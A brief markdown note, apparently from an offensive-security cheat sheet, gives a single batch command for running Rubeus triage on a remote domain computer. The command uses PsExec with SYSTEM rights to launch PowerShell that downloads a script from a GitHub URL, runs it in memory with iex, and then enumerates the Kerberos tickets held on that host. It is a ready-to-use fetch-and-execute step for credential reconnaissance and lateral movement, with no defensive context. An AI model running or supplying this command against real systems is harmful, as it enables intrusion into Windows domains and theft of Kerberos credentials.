# References
- [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)


# Run Invoke-Rubeus triage remotly
```batchfile
psexec.exe -s -accepteula -u <domain>\<user> \\<computer>.<domain.local> "powershell -Command "iex(New-Object Net.WebClient).DownloadString('https://github.com/okazymyrov/piki/raw/master/Invoke-Rubeus.ps1'); Invoke-Rubeus triage""
```
